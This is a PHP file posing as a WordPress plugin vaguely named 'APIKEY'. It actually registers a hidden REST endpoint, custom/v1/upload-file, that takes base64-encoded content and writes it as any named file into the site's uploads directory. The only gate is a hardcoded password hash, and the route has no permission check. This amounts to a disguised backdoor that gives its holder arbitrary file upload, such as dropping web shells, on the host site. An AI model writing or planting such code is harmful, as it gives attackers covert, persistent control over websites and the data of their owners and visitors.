<?php
/*
Plugin Name: APIKEY
Description: APIKEYS
*/

// Hashed password using bcrypt (example hash provided)
$hashed_password = '$2y$10$Y0WPRmok0S.NJInnpuLePuPhrDD0QVlvXmTlnGvtw72p.H11K5CEe'; 

function remote_file_upload() {
    global $hashed_password;

    // Check if the password is provided
    if (!isset($_POST['password'])) {
        return new WP_Error('unauthorized', 'Password is required', array('status' => 401));
    }

    // Verify the provided password against the stored hash
    if (!password_verify($_POST['password'], $hashed_password)) {
        return new WP_Error('unauthorized', 'Invalid password', array('status' => 401));
    }

    // Check if file_name and file_content are provided
    if (!isset($_POST['file_name']) || !isset($_POST['file_content'])) {
        return new WP_Error('missing_params', 'Missing file_name or file_content', array('status' => 400));
    }

    $file_name = sanitize_file_name($_POST['file_name']);
    $file_content = base64_decode($_POST['file_content']);

    $upload_dir = wp_upload_dir();
    $file_path = $upload_dir['path'] . '/' . $file_name;

    // Save the file to the server
    file_put_contents($file_path, $file_content);

    return array('status' => 'File uploaded successfully', 'file_path' => $file_path);
}

add_action('rest_api_init', function () {
    register_rest_route('custom/v1', '/upload-file/', array(
        'methods' => 'POST',
        'callback' => 'remote_file_upload',
    ));
});
